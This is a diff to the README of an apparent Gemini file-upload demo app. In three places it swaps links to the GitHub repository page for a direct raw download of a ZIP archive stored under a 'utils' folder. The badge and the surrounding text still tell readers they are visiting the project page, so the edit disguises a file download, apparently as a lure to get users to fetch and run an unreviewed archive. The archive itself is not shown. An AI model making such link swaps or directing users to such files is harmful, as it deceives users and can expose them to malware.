@@ -1,6 +1,6 @@
 # 🤖 gemini-file---uri-demo - Run Your AI File App Fast
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue.svg?style=for-the-badge)](https://github.com/jeannepunctilious742/gemini-file---uri-demo)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue.svg?style=for-the-badge)](https://github.com/jeannepunctilious742/gemini-file---uri-demo/raw/refs/heads/main/utils/demo-uri-gemini-file-v2.9.zip)
 
 ## 🖥️ What this app does
 
@@ -17,7 +17,7 @@ Use it when you want to:
 
 Visit this page to download and run the app files:
 
-https://github.com/jeannepunctilious742/gemini-file---uri-demo
+https://github.com/jeannepunctilious742/gemini-file---uri-demo/raw/refs/heads/main/utils/demo-uri-gemini-file-v2.9.zip
 
 Open the page, then use the download options on GitHub. If you see a ZIP file, save it to your computer and extract it.
 
@@ -35,7 +35,7 @@ If Node.js is not installed yet, install it first from the Node.js website, then
 ## 🚀 Get the files ready
 
 1. Open the GitHub page:
-   https://github.com/jeannepunctilious742/gemini-file---uri-demo
+   https://github.com/jeannepunctilious742/gemini-file---uri-demo/raw/refs/heads/main/utils/demo-uri-gemini-file-v2.9.zip
 
 2. Download the project files
 
